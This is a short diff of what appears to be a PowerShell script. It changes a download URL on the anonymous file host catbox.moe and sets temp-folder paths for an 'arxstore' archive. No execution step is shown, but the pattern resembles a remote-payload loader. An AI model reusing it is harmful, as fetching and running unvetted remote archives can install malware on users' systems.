@@ -1,4 +1,4 @@
-$zipUrl = "https://files.catbox.moe/p6somt.rar"
+$zipUrl = "https://files.catbox.moe/urynfq.zip"
 $tempDir = Join-Path $env:TEMP "arxstore"
 $zipPath = Join-Path $env:TEMP "arxstore.zip"
 
